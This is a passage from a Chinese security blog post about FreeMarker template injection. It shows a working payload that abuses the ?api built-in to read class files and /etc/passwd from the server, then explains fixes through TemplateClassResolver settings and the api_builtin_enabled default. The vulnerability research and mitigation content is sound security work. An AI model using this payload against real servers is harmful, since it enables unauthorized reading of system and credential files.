+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign is=object?api.class.getResourceAsStream(&quot;/Test.class&quot;)&gt;</span><br><span class="line">FILE:[&lt;#list 0..999999999 as _&gt;</span><br><span class="line">    &lt;#assign byte=is.read()&gt;</span><br><span class="line">    &lt;#if byte == -1&gt;</span><br><span class="line">        &lt;#break&gt;</span><br><span class="line">    &lt;/#if&gt;</span><br><span class="line">$&#123;byte&#125;, &lt;/#list&gt;]</span><br><span class="line">&lt;#assign uri=object?api.class.getResource(&quot;/&quot;).toURI()&gt;</span><br><span class="line">&lt;#assign input=uri?api.create(&quot;file:///etc/passwd&quot;).toURL().openConnection()&gt;</span><br><span class="line">&lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list 0..999999999 as _&gt;</span><br><span class="line">    &lt;#assign byte=is.read()&gt;</span><br><span class="line">    &lt;#if byte == -1&gt;</span><br><span class="line">        &lt;#break&gt;</span><br><span class="line">    &lt;/#if&gt;</span><br><span class="line">$&#123;byte&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>
+
+<h1 id="8-漏洞修复："><a href="#8-漏洞修复：" class="headerlink" title="8.漏洞修复："></a>8.漏洞修复：</h1><p>从 FreeMarker 2.3.17 版本开始，官方版本提供了三种不同的<code>TemplateClassResolver</code>实现类，用于控制通过<code>new()</code>函数创建类实例时的安全性：</p>
+<ol>
+<li>UNRESTRICTED_RESOLVER：无限制解析器</li>
+</ol>
+<ul>
+<li>允许通过<code>ClassUtil.forName(className)</code>反射加载任意 Java 类</li>
+<li>存在一定安全风险，可能被用于执行任意代码</li>
+</ul>
+<ol start="2">
+<li>SAFER_RESOLVER：安全解析器（推荐生产环境使用）</li>
+</ol>
+<ul>
+<li><p>默认禁止加载以下高危类：</p>
+</li>
+<li><p><code>freemarker.template.utility.JythonRuntime</code>（Jython 执行引擎）</p>
+</li>
+<li><p><code>freemarker.template.utility.Execute</code>（系统命令执行器）</p>
+</li>
+<li><p><code>freemarker.template.utility.ObjectConstructor</code>（任意类构造器）</p>
+</li>
+<li><p>有效防范常见的代码注入攻击</p>
+</li>
+</ul>
+<ol start="3">
+<li>ALLOWS_NOTHING_RESOLVER：禁用解析器</li>
+</ol>
+<ul>
+<li>完全禁止通过<code>new()</code>函数创建任何类实例</li>
+<li>适用于对安全性要求极高的场景</li>
+</ul>
+<ol start="4">
+<li>当api_builtin_enabled为true时才可使用api函数，而该配置在2.3.22版本之后默认为false</li>
+</ol>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/07/24/%E8%AE%B0%E6%9F%90%E6%AC%A1%E7%9C%81h%E9%80%9A%E8%BF%87struts%E6%8B%BF%E4%B8%8Bshell/" class="prev">← 记某次省h通过struts拿下shell</a>
+    
+    
+      <a href="/2025/07/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-structS2-001%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E6%96%B0%E7%89%88idea-%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="next">Java反序列化之 structS2-001环境搭建(新版idea)和漏洞复现 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
